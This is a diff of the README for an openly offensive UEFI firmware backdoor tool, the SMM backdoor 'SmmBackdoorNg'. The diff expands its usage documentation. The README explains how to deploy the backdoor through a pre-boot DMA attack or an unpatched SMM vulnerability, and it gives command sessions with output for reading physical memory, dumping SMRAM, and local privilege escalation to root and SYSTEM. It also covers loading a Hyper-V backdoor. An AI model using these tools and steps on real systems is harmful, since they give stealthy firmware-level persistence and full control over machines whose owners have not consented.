@@ -5,7 +5,7 @@
 
 This version of System Management Mode backdoor for UEFI based platforms was heavily inspired by [my previous project](http://blog.cr4.sh/2015/07/building-reliable-smm-backdoor-for-uefi.html) (check [its GitHub repository](https://github.com/Cr4sh/SmmBackdoor)) but introducing few key changes in order to make it more up to date:
 
- * In addition to the usual firmware flash image infection method as described in the article, new SMM backdoor also can be deployed with pre-boot DMA attack using [PCI Express DIY hacking toolkit](https://github.com/Cr4sh/s6_pcie_microblaze) (see [uefi_backdoor_simple.py](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/python/uefi_backdoor_simple.py) program usage for more details) and industry-wide EFI SMM Core [vulnerability exploitation](https://github.com/Cr4sh/SmmBackdoorNg/blob/main/src/exploit.c) to perform DXE to SMM execution transition. The vulnerability was discovered by myself and reported to Intel PSIRT years ago, but it still remains not patched on many products that using EDK2 derived firmware code, including whole [AMI Aptio](https://www.ami.com/aptio/) family.
+ * In addition to the usual firmware flash image infection method as described in the article, new SMM backdoor also can be deployed with pre-boot DMA attack using [PCI Express DIY hacking toolkit](https://github.com/Cr4sh/s6_pcie_microblaze) (see [uefi_backdoor_simple.py](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/python/uefi_backdoor_simple.py) program usage for more details) and industry-wide EFI SMM Core [vulnerability exploitation](https://github.com/Cr4sh/SmmBackdoorNg/blob/main/src/exploit.c) to perform DXE to SMM execution transition. The vulnerability was discovered by myself and reported to Intel PSIRT years ago, but it still remains not patched on many products that using old EDK2 derived firmware code, including whole [AMI Aptio](https://www.ami.com/aptio/) family. Latest generations of Intel machines are likely not vulnerable to this attack.
 
  * Client program `smm_backdoor.py` supports Windows and Linux systems and can interact with SMM backdoor using SW SMI (requires high privileges and [chipsec](https://github.com/chipsec/chipsec) installed) or APIC periodic timer method that can work with any privileges level.
 
@@ -20,7 +20,7 @@ This version of System Management Mode backdoor for UEFI based platforms was hea
 
 Project documentation is incomplete at this moment, but here's some command line examples.
 
-Deploying SMM backdoor using pre-boot DMA attack:
+Deploying SMM backdoor UEFI driver with PCI Express DIY hacking toolkit using pre-boot DMA attack:
 
 ```
 # python2 uefi_backdoor_simple.py --driver SmmBackdoorNg_X64.efi
@@ -47,7 +47,7 @@ Hooking LocateProtocol(): 0x7a3987b4 -> 0x000c20fc
 [+] DONE
 ```
 
-Basic use of SMM backdoor `smm_backdoor.py` client program:
+Basic use of SMM backdoor `smm_backdoor.py` client program to display backdoor debug messages buffer once it was loaded and system has been booted:
 
 ```
 # python2 smm_backdoor.py --debug
@@ -79,6 +79,9 @@ Basic use of SMM backdoor `smm_backdoor.py` client program:
 00000022 - backdoor.c(1328) : new_SetVirtualAddressMap()
 00000023 - backdoor.c(1369) : New address of the resident image is 0xfffffffeec79f000
 ```
+
+Check for responding backdoor and show basic information about System Management Mode execution environment:
+
 ```
 # python2 smm_backdoor.py --use-timer --test
 [+] Checking if SMM backdoor is present...
@@ -93,6 +96,9 @@ Basic use of SMM backdoor `smm_backdoor.py` client program:
  * 0x7b000000:7b000fff
  * 0x7b001000:7b7fffff
 ```
+
+Example of reading of arbitrary physical memory, beginning of SMRAM region in this case:
+
 ```
 # python2 smm_backdoor.py --use-timer --read-phys 0x7b000000 --size 0x80
 7b000000: 53 4d 4d 53 33 5f 36 34 90 c5 7d 7b 00 00 00 00 | SMMS3.64........
@@ -104,6 +110,9 @@ Basic use of SMM backdoor `smm_backdoor.py` client program:
 7b000060: 00 00 e1 13 e0 12 e0 12 f0 12 e1 13 f1 03 f1 03 | ................
 7b000070: f1 02 e1 13 e0 12 e0 12 e0 02 e1 13 f1 03 f1 03 | ................
 ```
+
+To read and dump entire SMRAM regions into the file you can use the following command:
+
 ```
 # python2 smm_backdoor.py --dump-smram
 ****** Chipsec Linux Kernel module is licensed under GPL 2.0
@@ -111,7 +120,7 @@ Basic use of SMM backdoor `smm_backdoor.py` client program:
 [+] Creating SMRAM_dump_7b000000_7b7fffff.bin
 ```
 
-Example of `smm_backdoor_privesc_linux.py` client program usage:
+Example of `smm_backdoor_privesc_linux.py` client program usage for local privileges escalation under the Linux operating system:
 
 ```
 $ python2 smm_backdoor_privesc_linux.py
@@ -133,7 +142,7 @@ sh-4.4# id
 uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),26(tape),27(video)
 ```
 
-Example of `smm_backdoor_privesc_win.py` client program usage:
+Example of `smm_backdoor_privesc_win.py` client program usage for local privileges escalation under the Windows operating system:
 
 ```
 PS C:\> python2 smm_backdoor_privesc_win.py
@@ -161,7 +170,7 @@ nt authority\system
 
 ## Using Together With Hyper-V Backdoor
 
-Once you have SMM backdoor loaded, as it shown above, you can use its capabilities to load Hyper-V backdoor during runtime phase with appropriate client program running inside guest or host Hyper-V partition. 
+Once you have SMM backdoor loaded, as it shown above, you can use its capabilities to load Hyper-V backdoor during runtime phase with appropriate client program running inside arbitrary guest or host Hyper-V partition. 
 
 To do that you need to save `backdoor.bin` file [form Hyper-V backdoor repository](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/python/payloads/DmaBackdoorHv/backdoor.bin) as `hyper_v_backdoor.bin` in the same folder with `smm_backdoor_hyper_v.py` test client program and then just run it:
 
@@ -191,7 +200,7 @@ PS C:\> python2 smm_backdoor_hyper_v.py
 [+] Done, Hyper-V backdoor was successfully installed
 ```
 
-In case when `smm_backdoor_hyper_v.py` is unable to locate target VMCS region &minus; you can override its default scanning options by specifying appropriate values in `--scan-from`, `--scan-to` and `--scan-step` command line arguments of the program.
+In case when `smm_backdoor_hyper_v.py` is unable to locate target VMCS region &minus; you can override its default scanning options by specifying appropriate values in `--scan-from`, `--scan-to` and `--scan-step` command line arguments of the program. Since VMCS region location stage might take a while, you also can use `--verbose` option of the program to display operation progress information.
 
 After successful Hyper-V backdoor load you can run its client program to ensure that backdoor is up and responding:
 
